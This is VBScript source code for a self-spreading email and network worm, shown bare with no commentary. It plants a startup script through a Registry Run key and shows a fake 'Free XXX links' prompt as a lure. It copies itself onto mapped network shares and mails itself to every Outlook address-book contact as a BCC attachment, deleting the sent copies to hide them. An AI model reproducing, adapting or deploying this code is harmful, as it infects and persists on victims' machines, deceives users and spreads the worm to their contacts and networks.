On Error Resume Next
Set objFSO = CreateObject("Scripting.FileSystemObject")

Set objFileRunDLL = objFSO.CreateTextFile("D:\WinNT\System32\RUNDLL.VBS", True)
'Write and create content of file rundll.vbs
'(See separate file)
objFileRunDLL.Close

Set objWShell = CreateObject("WScript.Shell")
objWShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Rundll", "D:\WinNT\System32\RUNDLL.VBS"
If MsgBox("This will add a shortcut to free XXX links on your desktop. Do you want to continue?", 36, "Free XXX links") = 6 Then
    Set objFileWebShortcut = objFSO.CreateTextFile("D:\WINNT\Profiles\UserName\Desktop\FREE XXX LINKS.URL", True)
    objFileWebShortcut.WriteLine "[InternetShortcut]"
    objFileWebShortcut.WriteLine "URL=http://www.sublimedirectory.com/"
    objFileWebShortcut.Close
End If

Set objWNetwork = CreateObject("WScript.Network")
Set objWNetworkDrives = objWNetwork.EnumNetworkDrives
If objWNetworkDrives.Count <> 0 Then
    For iDriveCount = 0 To objWNetworkDrives.Count - 1
        If InStr(objWNetworkDrives.Item(iDriveCount), "\\") <> 0 Then
            objFSO.CopyFile WScript.ScriptFullName, objFSO.BuildPath(objWNetworkDrives.Item(iDriveCount), "LINKS.VBS")
        End If
    Next
End If

Set objOutlook = CreateObject("Outlook.Application")
Set objNamespace = objOutlook.GetNameSpace("MAPI")
For Each objAddressList In objNamespace.AddressLists
    Set objMessage = objOutlook.CreateItem(0)
    For iCount = 1 To objAddressList.AddressEntries.Count
        Set objAddressEntry = objAddressList.AddressEntries(iCount)
        If iCount = 1 Then
            objMessage.BCC = objAddressEntry.Address
        Else
            objMessage.BCC = objMessage.BCC & "; " & objAddressEntry.Address
        End If
    Next
    objMessage.Subject = "Check this"
    objMessage.Body = "Have fun with these links."
    objMessage.Attachments.Add "D:\LINKS.VBS"
    objMessage.DeleteAfterSubmit = True
    objMessage.Send
Next
